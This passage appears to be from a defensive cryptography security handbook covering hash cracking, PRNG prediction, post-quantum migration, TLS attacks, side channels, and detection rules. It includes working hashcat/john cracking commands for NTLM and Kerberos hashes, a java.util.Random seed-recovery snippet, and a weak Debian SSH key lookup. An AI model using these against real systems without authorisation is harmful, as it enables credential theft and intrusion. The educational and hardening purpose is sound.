| Hash Format | Length | Example | hashcat Mode | john Format |
|------------|--------|---------|-------------|-------------|
| MD5 | 32 hex | `5d41402abc4b2a76b9719d911017c592` | 0 | raw-md5 |
| SHA-1 | 40 hex | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` | 100 | raw-sha1 |
| SHA-256 | 64 hex | `2cf24dba5fb0a30e26e83b2ac5b9e29e...` | 1400 | raw-sha256 |
| SHA-512 | 128 hex | `cf83e1357eefb8bdf1542850d66d8007...` | 1700 | raw-sha512 |
| bcrypt | 60 chars | `$2b$12$...` | 3200 | bcrypt |
| scrypt | variable | `$scrypt$...` | 8900 | scrypt |
| Argon2 | variable | `$argon2id$v=19$...` | — | argon2 |
| NTLM | 32 hex | `a4f49c406510bdcab6824ee7c30fd852` | 1000 | nt |
| NetNTLMv2 | variable | `user::domain:challenge:hmac:blob` | 5600 | netntlmv2 |
| Kerberos TGS (RC4) | variable | `$krb5tgs$23$*user$domain$...` | 13100 | krb5tgs |
| Kerberos AS-REP | variable | `$krb5asrep$23$user@domain:...` | 18200 | krb5asrep |
| DCC2 (mscache2) | variable | `$DCC2$10240#user#hash` | 2100 | mscash2 |
| DPAPI masterkey | variable | `$DPAPImk$...` | 15300 | — |

```bash
# hashcat — common attack modes
hashcat -m 0 hashes.txt wordlist.txt                  # MD5 dictionary
hashcat -m 1000 hashes.txt wordlist.txt -r best64.rule # NTLM + rules
hashcat -m 1400 hashes.txt -a 3 '?a?a?a?a?a?a?a?a'    # SHA-256 brute force
hashcat -m 3200 hashes.txt wordlist.txt                # bcrypt (slow)
hashcat -m 13100 hashes.txt wordlist.txt               # Kerberoast TGS

# john — format-specific cracking
john --format=raw-sha256 --wordlist=wordlist.txt hashes.txt
john --format=bcrypt --wordlist=wordlist.txt hashes.txt
```

**YARA rule for weak hash usage in code:**
```yara
rule Weak_Hash_Algorithm_Usage {
    meta:
        description = "Detects use of deprecated hash algorithms (MD5, SHA-1) in binaries"
        severity = "medium"
    strings:
        $md5_1 = "MD5" ascii wide
        $md5_2 = "EVP_md5" ascii
        $md5_3 = "hashlib.md5" ascii
        $sha1_1 = "SHA1" ascii wide
        $sha1_2 = "EVP_sha1" ascii
        $sha1_3 = "hashlib.sha1" ascii
        $sha1_4 = "MessageDigest.getInstance(\"SHA-1\")" ascii
    condition:
        any of them
}
```

### 2.5 Password hashing

**Argon2** (PHC winner). Three modes: Argon2d (data-dependent memory access — resistant to GPU/ASIC but vulnerable to side channels), Argon2i (data-independent — side-channel resistant but less memory-hard), Argon2id (hybrid — recommended). Parameters: memory size, iteration count, parallelism. The memory-hardness property means the algorithm requires a large amount of RAM to evaluate, making ASIC/FPGA attacks expensive.

**scrypt.** Memory-hard via ROMix (a random-read-from-large-array loop). Parameters: N (memory/CPU cost), r (block size), p (parallelism). scrypt's memory access pattern is less GPU-friendly than raw hashing but less resistant than Argon2 to some tradeoff attacks.

**bcrypt.** Blowfish-based. Fixed-cost: the cost parameter controls the number of key-setup rounds (2^cost). bcrypt's 72-byte input limit and 184-bit output are constraints; the Blowfish key setup is inherently serial, providing some resistance to GPU parallelism. However, FPGAs and specialized hardware can attack bcrypt efficiently.

**PBKDF2.** HMAC-based key derivation with iteration count. No memory-hardness: the entire computation is a chain of HMAC evaluations, which are efficiently parallelizable on GPUs, FPGAs, and ASICs. PBKDF2 with SHA-256 and a high iteration count is the minimum acceptable; Argon2id is strongly preferred.

**Recommended parameters (OWASP 2024):**

| Algorithm | Minimum Parameters | Target Latency |
|-----------|-------------------|----------------|
| Argon2id | m=19456 (19 MiB), t=2, p=1 | 500ms |
| bcrypt | cost=12 | 250ms |
| scrypt | N=2^17, r=8, p=1 | 500ms |
| PBKDF2-SHA256 | 600,000 iterations | 500ms |

**Testing password hash strength:**
```bash
# Benchmark cracking speed per algorithm on current hardware
hashcat -b -m 0     # MD5: ~50 GH/s on RTX 4090
hashcat -b -m 1000  # NTLM: ~100 GH/s on RTX 4090
hashcat -b -m 3200  # bcrypt: ~30 kH/s on RTX 4090
hashcat -b -m 1800  # sha512crypt: ~1.5 MH/s
hashcat -b -m 13100 # Kerberoast: ~1.5 GH/s

# Compare: Argon2id with recommended params
# Estimated: ~2 H/s per GPU — 7+ orders of magnitude slower than MD5
```

**Incident response — password database breach:**

1. Force password resets for all affected accounts immediately.
2. Assess the hash algorithm used — PBKDF2/bcrypt/Argon2 buy time; MD5/SHA-1/unsalted hashes are instantly crackable.
3. Enumerate which accounts used weak/reused passwords by checking against breach correlation datasets.
4. Enable MFA enforcement for all accounts.
5. Monitor for credential stuffing attacks (attackers will try recovered credentials on other services).

---

## 3. Random number generator attacks

### 3.1 Predictable PRNG

**Mechanism.** Cryptographic security requires unpredictable random numbers for keys, nonces, IVs, and tokens. Using a non-cryptographic PRNG (e.g., `Math.random()`, `java.util.Random`, C `rand()`, Python `random.random()`) for security-sensitive values allows an attacker to predict future outputs after observing a few outputs.

**Exploitation:**

Java `java.util.Random` — Linear Congruential Generator with 48-bit seed:
```python
# Recover java.util.Random seed from two consecutive outputs
# nextInt() returns bits 47..16 of the internal state
# Given output1, output2, brute-force the lower 16 bits
from itertools import product
for low_bits in range(2**16):
    seed = (output1 << 16) | low_bits
    next_state = (seed * 0x5DEECE66D + 0xB) & ((1 << 48) - 1)
    if (next_state >> 16) == output2:
        print(f"Recovered seed: {seed}")
        break
```

PHP `mt_rand()` — Mersenne Twister (MT19937): observable after 624 outputs:
```
# php_mt_seed — recover MT seed from mt_rand() outputs
# https://github.com/openwall/php_mt_seed
./php_mt_seed <observed_value>
# Recovers the seed, then predicts all future mt_rand() values
```

**Detection.**

YARA rule:
```yara
rule Insecure_PRNG_Usage {
    meta:
        description = "Detects non-cryptographic PRNG used for security values"
        severity = "critical"
    strings:
        $java_random = "java.util.Random" ascii
        $js_random = "Math.random()" ascii
        $c_rand = /\brand\s*\(/ ascii
        $py_random = "random.random()" ascii
        $py_randint = "random.randint(" ascii
        $php_rand = "mt_rand()" ascii
    condition:
        any of them
}
```

**Hardening — use cryptographic RNG only:**

| Language | Secure RNG | Insecure (NEVER use for security) |
|----------|-----------|----------------------------------|
| Python | `secrets.token_bytes()`, `os.urandom()` | `random.random()` |
| Java | `java.security.SecureRandom` | `java.util.Random` |
| JavaScript (Node) | `crypto.randomBytes()` | `Math.random()` |
| JavaScript (browser) | `crypto.getRandomValues()` | `Math.random()` |
| C/C++ | `getrandom(2)`, `/dev/urandom` | `rand()`, `srand()` |
| PHP | `random_bytes()`, `random_int()` | `mt_rand()`, `rand()` |
| Go | `crypto/rand` | `math/rand` |
| Rust | `rand::rngs::OsRng` | — |

### 3.2 Linux entropy: /dev/urandom vs /dev/random

`/dev/random` blocks when the kernel's entropy estimate drops below a threshold (pre-Linux 5.6). `/dev/urandom` never blocks. In modern Linux (5.6+), both behave identically once the CRNG is seeded — `/dev/random` only blocks until initial seeding is complete, then is equivalent to `/dev/urandom`.

**Risk:** Early-boot random generation (VM cloning, container startup, embedded devices without hardware RNG) may produce predictable output if the CRNG hasn't been seeded.

```bash
# Check kernel CRNG seeding status
cat /proc/sys/kernel/random/entropy_avail
# Value > 256 indicates the CRNG is fully seeded

# Verify hardware RNG availability
cat /proc/sys/kernel/random/entropy_avail
dmesg | grep -i "random\|rng\|entropy"
# Look for: "crng init done" (CRNG fully seeded)

# Use rng-tools to feed hardware entropy
apt install rng-tools
rngd -r /dev/hwrng  # feed hardware RNG to kernel entropy pool
```

### 3.3 Dual_EC_DRBG backdoor

NIST SP 800-90A included Dual_EC_DRBG, a deterministic random bit generator based on elliptic curve scalar multiplication. The NSA-selected curve points P and Q had a mathematical relationship: if Q = eP for a known scalar e, anyone knowing e can predict all future DRBG output from a single output block. This was effectively a kleptographic backdoor, confirmed by Snowden documents. RSA Security used Dual_EC_DRBG as the default in BSAFE, and the Juniper ScreenOS incident (CVE-2015-7755) demonstrated real-world exploitation of a modified Dual_EC_DRBG.

**Lesson:** Never use Dual_EC_DRBG. Prefer HMAC-DRBG or CTR-DRBG (both in NIST SP 800-90A, minus Dual_EC). Verify the DRBG used by your cryptographic library:
```bash
# OpenSSL — check DRBG implementation
openssl version -a | grep -i "OPENSSLDIR\|DRBG"
# Modern OpenSSL (3.x) uses CTR-DRBG with AES-256 by default
```

---

## 4. Post-quantum cryptography

### 4.1 The threat model

A sufficiently large quantum computer running Shor's algorithm can factor RSA moduli and compute discrete logarithms (breaking RSA, DSA, ECDSA, ECDH, DH) in polynomial time. Grover's algorithm provides a quadratic speedup for brute-force search, effectively halving symmetric key lengths (AES-128 → 64-bit security against quantum search; AES-256 → 128-bit). The "harvest now, decrypt later" threat: an adversary records encrypted traffic today and waits for a quantum computer to decrypt it later. This motivates migration now, before quantum computers are operational.

**Impact assessment by algorithm:**

| Algorithm | Quantum Impact | Post-Quantum Status |
|-----------|---------------|---------------------|
| AES-128 | Reduced to 64-bit (Grover) | Use AES-256 |
| AES-256 | Reduced to 128-bit (Grover) | Still secure |
| RSA-2048 | Broken (Shor) | Replace with ML-KEM |
| RSA-4096 | Broken (Shor) | Replace with ML-KEM |
| ECDH P-256 | Broken (Shor) | Replace with ML-KEM |
| ECDSA P-256 | Broken (Shor) | Replace with ML-DSA |
| Ed25519 | Broken (Shor) | Replace with ML-DSA |
| SHA-256 | Reduced to 128-bit (Grover) | Still secure |
| HMAC-SHA-256 | Minimal impact | Still secure |

### 4.2 NIST PQC standards

**ML-KEM (Kyber).** A module-lattice-based key encapsulation mechanism (KEM). Based on the Module Learning With Errors (MLWE) problem. The encapsulated key is an MLWE ciphertext; decapsulation uses the private key (the MLWE secret) to recover the shared key. The IND-CCA2 security is achieved via the Fujisaki-Okamoto transform (re-encrypting the decapsulated value and comparing with the ciphertext to detect tampering). Three parameter sets: ML-KEM-512 (128-bit security), ML-KEM-768 (192-bit), ML-KEM-1024 (256-bit).

**ML-DSA (Dilithium).** A module-lattice-based digital signature scheme. Uses the Fiat-Shamir with Aborts paradigm: the signer samples a masking vector, computes a challenge hash, and produces a response; if the response would leak information about the secret key (the "abort" condition), the signer retries. Three parameter sets: ML-DSA-44, ML-DSA-65, ML-DSA-87.

**SLH-DSA (SPHINCS+).** A stateless hash-based signature scheme. Based on FORS (Forest of Random Subsets) for one-time signatures, WOTS+ (Winternitz One-Time Signature) for chaining, and hypertrees (layered Merkle trees) for amortization. Purely hash-based — its security depends only on the collision resistance and preimage resistance of the hash function, making it the most conservative choice. Trade-off: large signature sizes (8–50 KB depending on parameters).

**Classic McEliece.** A code-based KEM using binary Goppa codes (Niederreiter variant). Extremely large public keys (hundreds of KB to over 1 MB) but small ciphertexts and fast encryption/decryption. Well-studied (the underlying problem has been analyzed for 40+ years). Practical only for settings where the public key can be distributed out-of-band.

**Falcon.** An NTRU-lattice-based signature scheme using fast Fourier sampling (Gaussian sampling in the NTRU lattice). Compact signatures (~660 bytes for 128-bit security) but complex implementation (floating-point arithmetic in the signing algorithm, requiring careful constant-time implementation).

**Size comparison:**

| Algorithm | Public Key | Ciphertext/Signature | Security Level |
|-----------|-----------|---------------------|---------------|
| ML-KEM-768 | 1,184 B | 1,088 B (ct) | NIST Level 3 |
| ML-KEM-1024 | 1,568 B | 1,568 B (ct) | NIST Level 5 |
| ML-DSA-65 | 1,952 B | 3,309 B (sig) | NIST Level 3 |
| SLH-DSA-SHA2-128s | 32 B | 7,856 B (sig) | NIST Level 1 |
| Falcon-512 | 897 B | 666 B (sig) | NIST Level 1 |
| Classic McEliece | 261,120 B | 128 B (ct) | NIST Level 1 |
| RSA-2048 (reference) | 256 B | 256 B (sig) | ~112-bit classical |
| ECDSA P-256 (reference) | 64 B | 64 B (sig) | ~128-bit classical |

### 4.3 Testing PQC implementations

```bash
# OpenSSL 3.5+ — generate ML-KEM keypair
openssl genpkey -algorithm mlkem768 -out mlkem768.pem

# OpenSSL — ML-DSA signature
openssl genpkey -algorithm mldsa65 -out mldsa65.pem
openssl dgst -sign mldsa65.pem -out sig.bin message.txt

# oqs-provider (Open Quantum Safe) for OpenSSL 3.x
# Adds PQC algorithms to OpenSSL
git clone https://github.com/open-quantum-safe/oqs-provider.git
cmake -S . -B build -DOPENSSL_ROOT_DIR=/usr/local/ssl
cmake --build build

# Test PQC TLS with OQS
openssl s_server -cert cert.pem -key key.pem \
  -groups kyber768:x25519_kyber768

# liboqs — standalone PQC library
# Build and test
cmake -GNinja -S . -B build
ninja -C build run_tests

# Check browser PQC support (Chrome/Edge ship X25519Kyber768)
# Navigate to chrome://flags/#enable-tls13-kyber
```

### 4.4 Hybrid deployment

Hybrid key exchange (e.g., X25519Kyber768 in TLS 1.3) combines a classical key exchange (X25519) with a post-quantum KEM (ML-KEM-768). The shared key is derived from both components. If either is broken (quantum computer breaks X25519, or a classical attack breaks ML-KEM), the other still provides security. This is the conservative migration strategy recommended by NIST, NSA, and ENISA.

**Deploying hybrid key exchange:**
```
# nginx (with OQS-provider)
ssl_ecdh_curve x25519_kyber768:X25519:secp384r1;

# Apache (with OQS-provider)
SSLOpenSSLConfCmd Curves x25519_kyber768:X25519:secp384r1

# Verify hybrid key exchange is active
openssl s_client -connect target.com:443 -groups x25519_kyber768
# Look for: "Server Temp Key: X25519Kyber768"

# Cloudflare/AWS — enable PQC in CDN configuration
# Cloudflare enables X25519Kyber768 by default for supported clients
```

**Migration planning checklist:**

| Phase | Action | Timeline |
|-------|--------|----------|
| Inventory | Catalog all crypto usage (keys, certs, protocols) | Now |
| Assess | Identify harvest-now-decrypt-later risk per data class | Now |
| Prototype | Test hybrid key exchange in non-production | Now–6 months |
| Deploy | Enable hybrid TLS, PQC key agreement | 6–18 months |
| Migrate | Replace RSA/ECDSA signatures with ML-DSA | 12–36 months |
| Deprecate | Remove classical-only cipher suites | 24–48 months |

### 4.5 CNSA 2.0 requirements

NSA's Commercial National Security Algorithm Suite 2.0 (September 2022) mandates:

| Use Case | Algorithm | Timeline |
|----------|-----------|----------|
| Software/firmware signing | ML-DSA-65 or ML-DSA-87 | Prefer by 2025, require by 2030 |
| Key establishment | ML-KEM-768 or ML-KEM-1024 | Prefer by 2025, require by 2030 |
| Symmetric encryption | AES-256 | Immediate (already required) |
| Hashing | SHA-384 or SHA-512 | Immediate |
| Web/email/VPN | ML-KEM + ML-DSA | Prefer by 2025, exclusive by 2033 |
| Traditional public key | Disallow RSA/ECC | By 2033 |

CNSA 2.0 represents the most aggressive PQC migration timeline from any government body. Organizations handling classified or long-lived sensitive data should align with these dates. The transition from CNSA 1.0 (RSA-3072+, P-384, SHA-384) to CNSA 2.0 (lattice-based PQC) is a one-way migration — there is no planned return to classical algorithms.

---

## 5. TLS protocol attacks

> Each attack covers the CVE, cryptographic mechanism, testing commands, and remediation. See also Domain 9 Chapter 9A for TLS protocol mechanics.

### 5.1 BEAST (CVE-2011-3389)

**Mechanism.** In TLS 1.0, the IV for each CBC record is the last ciphertext block of the previous record — predictable to the attacker. By injecting chosen plaintext adjacent to a secret value (e.g., a session cookie) within the same TLS connection (via JavaScript), the attacker creates a block whose encryption can be predicted. Comparing the resulting ciphertext against a dictionary recovers the secret one byte at a time (blockwise chosen-boundary attack, Duong and Rizzo, 2011).

**Testing.**
```bash
testssl.sh --beast target.com:443
nmap -p 443 --script ssl-enum-ciphers target.com | grep -A5 "TLSv1.0"
# Vulnerable if TLS 1.0 + CBC cipher suites are enabled
```

**Hardening.** (1) Disable TLS 1.0 and TLS 1.1. (2) In TLS 1.2: prefer AEAD cipher suites (GCM, ChaCha20-Poly1305) over CBC. (3) TLS 1.3 eliminates CBC entirely.

### 5.2 CRIME (CVE-2012-4929) and BREACH (CVE-2013-3587)

**CRIME.** Exploits TLS-level compression (DEFLATE). The attacker injects chosen plaintext into the same compression context as a secret. If the guess matches part of the secret, compressed size decreases (DEFLATE finds a repeated string). Observing ciphertext length changes for different guesses recovers the secret byte by byte.

**BREACH.** Same principle but targets HTTP-level gzip/deflate compression on response bodies. The attacker injects a guess via reflected parameter and observes compressed response length. Harder to mitigate because HTTP compression is critical for performance.

**Testing.**
```bash
# CRIME — check TLS compression
openssl s_client -connect target.com:443 2>&1 | grep "Compression"
# "Compression: NONE" = safe; "Compression: zlib" = CRIME-vulnerable

testssl.sh --crime target.com:443

# BREACH — check HTTP compression on pages with reflected input
curl -sI -H "Accept-Encoding: gzip,deflate" https://target.com/search?q=test \
  | grep -i "Content-Encoding"
# If gzip and page reflects user input alongside secrets: BREACH-vulnerable
```

**Hardening — CRIME.** Disable TLS compression (OpenSSL: `SSL_OP_NO_COMPRESSION`; most modern stacks disable by default). **BREACH.** (1) Separate secrets from reflected user content in HTTP responses. (2) Add random padding to response bodies. (3) Use SameSite cookies and CSRF tokens. (4) Rate-limit requests.

### 5.3 POODLE (CVE-2014-3566)

**Mechanism.** SSL 3.0 uses non-deterministic CBC padding: padding bytes can be any value; only the last byte (padding length) is checked. The attacker forces a downgrade to SSL 3.0, then manipulates ciphertext block boundaries. By observing whether the server accepts the padding (a padding oracle), the attacker recovers plaintext one byte at a time. The TLS variant (CVE-2014-8730) targets TLS implementations that don't validate all padding bytes (accepting any values instead of requiring padding bytes to equal the padding length per PKCS#7).

**Testing.**
```bash
testssl.sh --poodle target.com:443

# Direct SSLv3 test
openssl s_client -connect target.com:443 -ssl3
# Connection success = SSLv3 supported = vulnerable

nmap -p 443 --script ssl-poodle target.com
```

**Hardening.** (1) Disable SSL 3.0 entirely. (2) Enable TLS_FALLBACK_SCSV (RFC 7507) to prevent downgrade. (3) Disable CBC cipher suites in legacy TLS versions.
```
# nginx
ssl_protocols TLSv1.2 TLSv1.3;

# Apache
SSLProtocol -all +TLSv1.2 +TLSv1.3
```

### 5.4 DROWN (CVE-2016-0800)

**Mechanism.** Decrypting RSA with Obsolete and Weakened eNcryption. If a TLS 1.2 server shares its RSA private key with any server supporting SSLv2 (even a different host with the same certificate), the attacker uses SSLv2's export-grade ciphers as a Bleichenbacher-like oracle to decrypt TLS 1.2 RSA key exchanges. At disclosure, ~33% of HTTPS servers were vulnerable.

**Testing.**
```bash
testssl.sh --drown target.com:443

# Check SSLv2 directly
openssl s_client -connect target.com:443 -ssl2
# Also check other hosts sharing the same certificate/key

nmap -p 443 --script sslv2-drown target.com
```

**Hardening.** (1) Disable SSLv2 on ALL servers sharing the same RSA key. (2) Use separate keys for different services. (3) Prefer ECDHE key exchange (forward secrecy). (4) Audit mail servers, LDAP, and other TLS-enabled services sharing certificates.

### 5.5 ROBOT (CVE-2017-6168, CVE-2017-17382, CVE-2017-17427, CVE-2017-17428)

**Mechanism.** Return Of Bleichenbacher's Oracle Threat. Modern TLS stacks' Bleichenbacher countermeasures were incorrect — timing differences, error codes, or connection behavior still leaked PKCS#1 v1.5 padding validity. Requires RSA key exchange (not ECDHE), typically ~10,000-100,000 oracle queries.

**Testing.**
```bash
# ROBOT scanner (original researchers' tool)
python3 robot-detect.py -h target.com

testssl.sh --robot target.com:443
```

**Hardening.** Disable RSA key exchange cipher suites (those with `kRSA` in the key exchange). Use only ECDHE/DHE. TLS 1.3 removes RSA key exchange entirely.

### 5.6 Raccoon (CVE-2020-1968)

**Mechanism.** Timing side-channel in DHE key exchange. The DH shared secret's leading zero bytes are stripped before use as premaster secret. Secrets with leading zeros require less processing time. By measuring server response time across many handshakes, the attacker determines zero-byte presence, creating a Bleichenbacher-like oracle.

**Testing.**
```bash
testssl.sh --raccoon target.com:443
```

**Hardening.** (1) Pad DH shared secret to fixed length (constant-time). (2) Use ECDHE instead of DHE. (3) TLS 1.3 uses HKDF which handles variable-length inputs uniformly.

### 5.7 Renegotiation attack (CVE-2009-3555)

**Mechanism.** Before RFC 5746, TLS renegotiation was not cryptographically bound to the original session. A MitM attacker establishes a TLS session with the server, injects arbitrary plaintext (e.g., partial HTTP request), then splices the victim's handshake as a "renegotiation." The server processes the attacker's injected data as part of the victim's authenticated session.

**Testing.**
```bash
testssl.sh --renegotiation target.com:443

openssl s_client -connect target.com:443 2>&1 | grep "Secure Renegotiation"
# "IS supported" = patched; "IS NOT supported" = vulnerable
```

**Hardening.** (1) Require RFC 5746 secure renegotiation (`renegotiation_info` extension). (2) Disable client-initiated renegotiation. (3) TLS 1.3 replaces renegotiation with `KeyUpdate` messages, cryptographically bound.

### 5.8 Comprehensive TLS testing

```bash
# testssl.sh — full audit
testssl.sh --full target.com:443

# sslyze
sslyze --regular target.com:443

# nmap TLS enumeration
nmap -p 443 --script ssl-enum-ciphers,ssl-cert target.com
```

**Recommended TLS 1.2/1.3 cipher suite configuration:**
```
# nginx
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
ssl_prefer_server_ciphers on;
ssl_session_tickets off;
ssl_stapling on;
ssl_stapling_verify on;

# Apache
SSLProtocol -all +TLSv1.2 +TLSv1.3
SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305
SSLHonorCipherOrder on
SSLCompression off
SSLSessionTickets off
```

---

## 6. Side-channel attacks on cryptographic implementations

### 6.1 Timing attacks on RSA and ECDSA

**RSA timing.** The square-and-multiply algorithm for modular exponentiation processes each bit of d: for a 1-bit, multiply-and-square; for a 0-bit, square only. The multiplication step takes additional time, leaking each bit. Kocher (1996) demonstrated remote RSA private key recovery. Montgomery multiplication with extra reductions also leaks through timing.

**ECDSA timing.** The scalar multiplication k*G in ECDSA signing leaks bits of nonce k through timing variations in double-and-add. Brumley and Tuveri (2011) recovered an OpenSSL ECDSA private key via remote TLS handshake timing.

**Hardening.** (1) Constant-time implementations (no secret-dependent branches). (2) RSA blinding: multiply input by r^e before decryption, divide by r after (OpenSSL enables by default). (3) Montgomery ladder or wNAF with constant-time conditional swaps for ECC.

### 6.2 Cache attacks (FLUSH+RELOAD, PRIME+PROBE)

**FLUSH+RELOAD.** Requires shared memory (shared libraries, deduplication). Attacker flushes a cache line (`clflush`), waits for victim execution, measures reload time. Fast reload = victim accessed that line (specific T-table entry, square-vs-multiply function). Yarom and Falkner (2014) recovered 96.7% of RSA key bits from ~200 OpenSSL decryptions.

**PRIME+PROBE.** No shared memory required. Attacker fills cache sets with own data ("prime"), waits, re-accesses ("probe"). Slow access = victim evicted attacker's data, indicating victim accessed that cache set. Works across VMs sharing physical cache (cloud environments).

**Hardening.** (1) AES-NI (no T-tables). (2) Disable memory deduplication (KSM on Linux: `echo 0 > /sys/kernel/mm/ksm/run`). (3) Intel Cache Allocation Technology (CAT) for cache partitioning. (4) KPTI for kernel/user isolation.

### 6.3 Power analysis (SPA/DPA) and electromagnetic analysis

**SPA.** Directly observing the power trace reveals operation sequence. For RSA square-and-multiply: squaring and multiplication have distinct power signatures, directly leaking exponent bits.

**DPA.** Statistical correlation across many traces. For AES: hypothesize key byte values, predict intermediate Hamming weight (e.g., after SubBytes), correlate with measured power. Correct hypothesis produces highest correlation. CPA refines DPA with Hamming-distance model.

**Countermeasures.** (1) Masking: XOR intermediates with random mask, remove at end. (2) Hiding: random delays, operation shuffling, equalized power consumption. (3) Dual-rail logic for balanced circuits.

### 6.4 Meltdown and Spectre implications for cryptography

**Meltdown (CVE-2017-5754).** Speculative execution allows reading kernel memory. Crypto keys in kernel space (dm-crypt/LUKS keys, kernel TLS offload) can be extracted.

**Spectre (CVE-2017-5753, CVE-2017-5715).** Variant 1 can bypass constant-time protections if the compiler introduces speculative secret-dependent loads. Variant 2 (branch target injection) enables attacker-controlled speculative execution leaking key material through cache state.

**Crypto impact.** (1) KPTI mitigates Meltdown but adds ~5% TLS throughput overhead. (2) Retpoline/IBRS mitigate Spectre v2. (3) Process isolation (separate address spaces for crypto) is the strongest defense. (4) Spectre v1 can potentially defeat software constant-time guarantees — hardware mitigations (SSBD, speculation barriers) required.

---

## 7. Implementation flaws

### 7.1 RNG failures

**Debian OpenSSL (CVE-2008-0166).** In 2006, a Debian maintainer commented out two lines in OpenSSL's PRNG that used uninitialized memory as entropy (Valgrind flagged them). This reduced effective entropy to the process ID (max ~32,768 values). ALL keys generated on affected Debian/Ubuntu systems between September 2006 and May 2008 came from a set of ~32,768 possible keys per key type and size.

**Exploitation.**
```bash
# Pre-computed weak key database
# https://github.com/g0tmi1k/debian-ssh
wget https://github.com/g0tmi1k/debian-ssh/raw/master/common_keys/debian_ssh_rsa_2048_x86.tar.bz2
tar xjf debian_ssh_rsa_2048_x86.tar.bz2
# Compare target SSH key against weak key database
ssh-keyscan target.com 2>/dev/null | ssh-keygen -l -f -

# openssl-vulnkey — check for weak keys
openssl-vulnkey /path/to/key.pem
```

**Hardening.** Re-generate ALL keys on affected systems. Revoke ALL certificates with weak keys. Audit entropy sources: `cat /proc/sys/kernel/random/entropy_avail` (>= 256 for key generation). Use `getrandom()` syscall (Linux 3.17+). Hardware RNG (RDRAND/RDSEED) as supplementary source only.

**Android SecureRandom (2013).** Java `SecureRandom` on Android failed to properly seed the OpenSSL PRNG. Bitcoin wallet apps using `SecureRandom` for ECDSA nonces produced nonce collisions, enabling private key recovery via the nonce-reuse attack (section 2.2). Google issued a fix; mitigation: deterministic nonces via RFC 6979.

### 7.2 IV and key reuse

**IV reuse in CBC.** Same IV and key for two messages = deterministic encryption; identical first blocks produce identical ciphertext blocks. Birthday bound on 128-bit IV: ~2^64 messages.

**KRACK (CVE-2017-13077).** Key Reinstallation Attack on WPA2. The attacker forces the victim to reinstall an already-in-use encryption key by replaying 4-way handshake messages, resetting the nonce counter to zero. This produces keystream reuse in AES-CTR (CCMP) or XOR of keystream and plaintext in AES-GCMP, enabling plaintext recovery and packet injection.

**Testing.**
```bash
# KRACK detector
# https://github.com/vanhoefm/krackattacks-scripts
python3 krack_test.py --interface wlan0 --target-bssid AA:BB:CC:DD:EE:FF
```

**Hardening.** (1) Apply vendor patches (all major OS vendors patched by late 2017). (2) Use WPA3 (SAE handshake is resistant to key reinstallation). (3) VPN overlay for sensitive wireless traffic.

### 7.3 Downgrade attacks

**FREAK (CVE-2015-0204).** Factoring RSA Export Keys. TLS clients could be tricked into accepting 512-bit RSA "export" keys. The 512-bit key can be factored in hours. A state-machine bug causes the client to accept an export-grade ServerKeyExchange even though export ciphers were not negotiated.

**Testing.**
```bash
testssl.sh --freak target.com:443
nmap -p 443 --script ssl-enum-ciphers target.com | grep -i "EXPORT"
```

**TLS 1.3 anti-downgrade.** The server sets the last 8 bytes of ServerHello.random to a sentinel value when it supports TLS 1.3 but negotiates TLS 1.2. A MitM cannot reproduce this sentinel, so the client detects the downgrade.

**Hardening.** (1) Remove all EXPORT cipher suites. (2) Remove ciphers with key < 128 bits. (3) Implement TLS_FALLBACK_SCSV (RFC 7507). (4) Disable SSLv2, SSLv3, TLS 1.0, TLS 1.1.

---

## 8. Cryptographic implementation auditing (tooling)

### 8.1 Identifying weak crypto in codebases

```bash
# semgrep — scan for weak crypto patterns
semgrep --config "p/insecure-crypto" /path/to/codebase

# grep — manual search for weak algorithms
grep -rn "DES\|RC4\|MD5\|SHA1\|ECB\|PKCS1v15" --include="*.py" --include="*.java" .

# openssl — test server TLS configuration
testssl.sh https://target.com
# Reports: cipher suites, certificate chain, vulnerabilities, PFS support

# sslyze — Python-based TLS scanner
sslyze --regular target.com

# nmap — SSL enumeration
nmap -sV --script ssl-enum-ciphers -p 443 target.com
```

### 8.2 Certificate chain validation

```bash
# Verify full certificate chain
openssl verify -CAfile ca-bundle.crt -untrusted intermediate.crt server.crt

# Check certificate details
openssl x509 -in cert.pem -text -noout | grep -E "Issuer|Subject|Not After|Public-Key|Signature Algorithm"

# Test for certificate transparency
# CT logs ensure CA-issued certificates are publicly logged
curl "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value' | sort -u

# Check OCSP stapling
openssl s_client -connect target.com:443 -status 2>&1 | grep "OCSP Response Status"

# Verify HPKP/HSTS headers
curl -sI https://target.com | grep -iE "strict-transport|public-key-pins|expect-ct"
```

### 8.3 Key management hardening

```bash
# Generate strong keys
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:4096 -out rsa4096.pem
openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-384 -out ec384.pem
openssl genpkey -algorithm ed25519 -out ed25519.pem

# Protect private keys at rest
openssl pkey -in key.pem -out key-encrypted.pem -aes-256-cbc
chmod 600 key.pem key-encrypted.pem

# HSM integration (PKCS#11)
# List objects on HSM
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so -O

# Generate key on HSM (never leaves hardware)
pkcs11-tool --module /usr/lib/softhsm/libsofthsm2.so \
  --keypairgen --key-type EC:secp384r1 --id 01 --label "tls-key"
```

---

## 9. Detection architecture for cryptographic attacks

### 9.1 Consolidated detection rules

Sigma rule — weak cipher suite negotiation:
```yaml
title: TLS Connection Using Deprecated Cipher Suite
logsource:
  product: zeek
  service: ssl
detection:
  selection:
    cipher|contains:
      - "RC4"
      - "DES"
      - "NULL"
      - "EXPORT"
      - "anon"
      - "CBC"
  condition: selection
level: medium
tags:
  - attack.credential_access
  - attack.t1557
```

KQL — detect weak TLS versions:
```kql
CommonSecurityLog
| where DeviceProduct == "PAN-OS" or DeviceProduct == "Zscaler"
| where AdditionalExtensions has_any ("TLSv1.0", "TLSv1.1", "SSLv3")
| project TimeGenerated, SourceIP, DestinationIP, DestinationPort,
